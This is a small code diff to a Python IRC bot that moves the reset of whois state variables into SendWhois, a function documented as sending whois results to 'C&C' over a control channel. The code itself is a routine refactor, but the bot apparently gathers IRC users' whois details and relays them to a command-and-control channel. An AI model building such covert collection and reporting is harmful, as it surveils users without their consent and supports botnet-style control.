@@ -172,8 +172,6 @@ def whois9(message):
     else:
         WHOIS_B = WHOIS_B + "\n" + str(message)
         ParseResult(WHOIS_B)
-        WHOIS_B = None
-        IsRealUser = False
 
 
 def ReplyError():
@@ -206,7 +204,6 @@ def ParseResult(result):
                 SendWhois()
 
 
-
 def SendWhois():
     """Send Whois results to C&C."""
     print("Saying")
@@ -222,6 +219,10 @@ def SendWhois():
     bot.say(CC_CHANNEL, msg)
     global userS
     userS = User()
+    global WHOIS_B
+    global IsRealUser
+    WHOIS_B = None
+    IsRealUser = None
 
 
 @bot.on("message")
